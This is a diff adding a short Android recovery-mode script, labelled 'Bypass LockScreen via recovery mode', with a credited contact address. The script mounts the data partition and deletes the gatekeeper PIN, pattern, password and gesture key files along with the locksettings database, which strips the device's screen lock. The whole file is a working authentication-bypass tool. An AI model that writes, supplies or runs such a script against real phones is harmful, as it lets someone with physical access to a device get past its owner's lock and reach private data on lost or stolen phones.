@@ -1,0 +1,18 @@
+show_progress(1.00000,10);
+ui_print("--------------------");
+ui_print("[+]Bypass	LockScreen");
+ui_print("[+]via	recovery	mode");
+ui_print("[+]Report =	simi.prambos@gmail.com");
+ui_print("--------------------");
+ui_print("[+]Mounting	System");
+run_program("/sbin/busybox","mount","/data");
+ui_print("[+]Executing	script");
+ui_print("[+]Removing	Lock");
+delete("/data/system/gatekeeper.gesture.key");
+delete("/data/system/gatekeeper.pin.key");
+delete("/data/system/gatekeeper.password.key");
+delete("/data/system/gatekeeper.pattern.key");
+delete("/data/system/locksettings.db");
+delete("/data/system/locksettings.db-shm");
+delete("/data/system/locksettings.db-wal");
+ui_print("[+]Done");
